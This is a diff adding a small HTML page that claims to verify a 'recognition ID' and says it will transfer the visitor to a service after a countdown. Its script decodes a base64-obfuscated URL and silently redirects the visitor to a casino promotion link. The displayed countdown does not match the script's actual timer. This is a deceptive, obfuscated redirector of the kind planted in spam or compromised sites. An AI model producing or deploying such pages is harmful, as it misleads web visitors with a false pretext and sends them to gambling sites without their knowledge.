@@ -1,0 +1,44 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>expect transition.......</title>
+</head>
+<body>
+<br>
+<center>
+<span style="color:#000000;font-family: Arial, Helvetica, sans-serif;font-size:16px;line-height:14px;">
+Wait a moment, recognition ID<br>
+Approximately through 
+<span style="color:green;font-size:18px;font-weight: bold;" id="timer" name="timer">5</span> 
+seconds, we will transfer you to the service.....
+</span>
+</center>
+<br>
+<center><div class="qSmJ">
+<img src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExYmxxM2ZkYTU1MG9rOHppaWkzZG53c3AxNjJ2emRwMHlqMjJrbTM0aSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/ZT1nXvb1Z3knMZtl3X/giphy.gif">
+</div></center>
+
+<script type="text/javascript">
+var timer = 2;   // ← можно поменять на любое количество секунд
+
+function ftimer() {
+    document.getElementById("timer").innerHTML = timer;
+    timer = timer - 1;
+    
+    if (timer == 0) {
+        var encode = "aHR0cHM6Ly9jYXNpbm8tcGxheS5jYy8/cHJvbW89NTAwMHByb21v";
+        var need_url = window.atob(encode);
+        console.log(need_url);
+        location.replace(need_url);
+    }
+    
+    setTimeout('ftimer()', 1000);
+}
+</script>
+
+<script type="text/javascript">
+    ftimer();
+</script>
+
+</body>
+</html>
